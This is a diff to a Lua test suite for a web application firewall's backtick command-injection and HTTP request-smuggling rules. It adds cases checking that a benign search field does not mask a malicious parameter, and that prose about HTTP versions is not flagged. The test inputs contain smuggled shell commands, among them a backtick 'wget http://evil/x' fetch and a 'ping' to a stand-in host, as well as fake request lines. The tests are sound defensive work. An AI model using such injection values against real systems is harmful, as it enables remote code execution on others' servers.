@@ -75,6 +75,10 @@ fires(get("name=`ping -c1 evil`"),     "backtick ping",   BT)
 fires(get("x=`foo;bar`"),              "backtick semi",   BT)
 fires(get("x=`foo|bar`"),              "backtick pipe",   BT)
 fires(get("x=`foo&&bar`"),             "backtick and",    BT)
+-- Cross-param: a benign backtick in a search field must NOT mask a malicious
+-- backtick command in another param (the search-field suppression used to be
+-- request-global — see the strengthened final check).
+fires(get("x=`wget http://evil/x`&q=`hello`"), "cmd in non-search param not masked by benign q=", BT)
 
 -- FP negatives: benign backtick content with neither a command word nor a
 -- shell metachar must NOT fire (challenge is user-visible).
@@ -98,10 +102,14 @@ fires(get("u=post /login http/1.0"),    "smuggled post (lowercase, args)", "WAF_
 fires(get("x=PUT /a HTTP/1.1"),         "smuggled PUT (uppercase, args)",  "WAF_HTTP_SMUGGLING:SMUG_PUT")
 fires(post("payload=DELETE /x HTTP/2"), "smuggled DELETE (body)",          "WAF_HTTP_SMUGGLING:SMUG_DELETE")
 
--- FP negatives: "http/" mentions that are not a "VERB path HTTP/n" request line.
+-- FP negatives: "http/" mentions that are not a "VERB /path HTTP/n" request line.
 clean(get("q=see the http/2 spec for details"), "prose http/2 mention")
 clean(get("url=https://x/http/1/guide"),        "path segment named http")
 clean(get("note=get well soon"),                "verb word without request line")
+-- Verb-word adjacent to http/N but the target is a word, not a "/path" — must
+-- NOT fire (the path anchor rejects English prose about HTTP versions).
+clean(post("note=connect to http/2 is supported"), "prose: connect to http/2")
+clean(post("body=options for http/2 and copy of http/1.1 spec"), "prose: options/copy + http")
 
 if fails > 0 then
   io.stderr:write(("cfm_waf backtick/smuggling tests: %d FAILED\n"):format(fails))
